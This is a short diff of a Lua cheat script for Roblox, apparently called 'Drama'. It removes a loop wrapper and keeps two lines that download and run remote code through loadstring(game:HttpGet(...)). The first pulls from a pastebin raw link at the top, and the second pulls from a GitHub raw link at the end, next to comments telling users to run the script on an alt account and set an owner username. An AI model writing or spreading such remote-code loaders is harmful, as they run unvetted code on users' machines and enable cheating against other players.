@@ -1,4 +1,3 @@
-
 loadstring(game:HttpGet("https://pastebin.com/raw/tp8eVx80"))()
 
 local guiyyy = Instance.new("ScreenGui")
@@ -3905,8 +3904,6 @@ while wait() do local hue = tick() % 15 / 15
  local color = Color3.fromHSV(hue,1,1)     stroke.Color = color
 end
 
-while true do
-wait(5)
 --[[
 This script has been made by Drama | 7rab on top!
 Please execute this script on your alt, not main!
@@ -3923,4 +3920,3 @@ getgenv().BetaGUI = false -- True / False, Making it false will hide the GUI, ak
 
 getgenv().DramaOwner = {"neeeeianecheater"} -- Replace with your main account username / No spaces / No Display Names
 loadstring(game:HttpGet("https://raw.githubusercontent.com/z7rab/Drama/main/Drama.lua"))("t.me/arceusxscripts")
-end
